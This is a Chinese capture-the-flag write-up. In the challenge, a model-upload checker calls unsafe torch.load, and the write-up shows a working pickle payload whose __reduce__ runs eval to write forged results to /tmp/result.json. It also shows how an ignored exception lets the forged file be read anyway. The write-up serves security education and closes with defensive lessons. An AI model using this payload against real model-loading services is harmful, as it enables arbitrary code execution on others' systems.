# 二次元神经网络

## 题目简述

网站要求上传一个 PyTorch 模型参数文件。检查器会用模型生成十张图片，只有每张图片与标准答案的误差都足够小才返回 flag。附件中的初始模型远达不到阈值，但检查流程会对用户文件执行不安全的 `torch.load`。

虽然题面以机器学习为背景，决定性原语并不是训练、对抗样本或模型推理，而是 Python Pickle 反序列化导致的任意代码执行，因此归入执行边界利用方向。

## 解题过程

### 找到不安全加载点

`infer.py` 中的关键语句是：

```python
model.load_state_dict(torch.load(pt_file, map_location="cpu"))
```

PyTorch 1.9.1 的 `torch.load` 默认使用 Pickle 反序列化对象。Pickle 会调用对象的 `__reduce__` 返回值来重建对象；若攻击者控制文件，就能把任意可调用对象及其参数写入反序列化流程。

检查器还有第二个缺陷：它吞掉 `infer` 抛出的异常，却无条件读取结果文件。

```python
try:
    infer(io.BytesIO(binary))
except Exception:
    pass

print(open("/tmp/result.json", "r").read())
```

因此，恶意对象只要先写好 `/tmp/result.json` 即可。后续 `load_state_dict` 因类型错误而失败不会影响利用结果。

### 直接伪造正确输出

附件已经包含十张标准图片对应的 `dataset/pixels_10.pt`。在本地把张量逐张编码为 PNG，再转为 Base64，构造检查器预期的 JSON：

```python
import base64
import io
import json

import matplotlib.image
import torch

pixels = torch.load("dataset/pixels_10.pt", map_location="cpu")
images = []
for image in pixels:
    out = io.BytesIO()
    matplotlib.image.imsave(out, image.numpy(), format="png")
    images.append(base64.b64encode(out.getvalue()).decode())

result = json.dumps({"gen_imgs_b64": images})
```

随后让 Pickle 在加载时执行写文件表达式：

```python
code = "open('/tmp/result.json','w').write(" + repr(result) + ")"

class Exploit:
    def __reduce__(self):
        return eval, (code,)

torch.save(Exploit(), "model_exp.pt")
```

把 `model_exp.pt` 上传到网站。反序列化阶段先执行 `eval(code)`，把十张标准图片写入结果文件；随后虽然 `load_state_dict` 报错，外层仍会读取刚刚写入的合法 JSON。误差计算得到零或接近零，网站据此返回 flag。

两个动漫图片和终端壁纸截图只属于官方题解的花絮，不承载利用信息，故没有归档为图片。

## 方法总结

模型文件不只是数据文件。旧式 `torch.load` 可以执行 Pickle 中携带的代码，不能加载不可信来源的模型。审计上传型模型服务时，应同时检查反序列化格式、执行用户模型的隔离边界，以及异常后的控制流。本题正是“危险反序列化 + 异常被忽略 + 结果文件无条件读取”三者组合造成的命令执行。
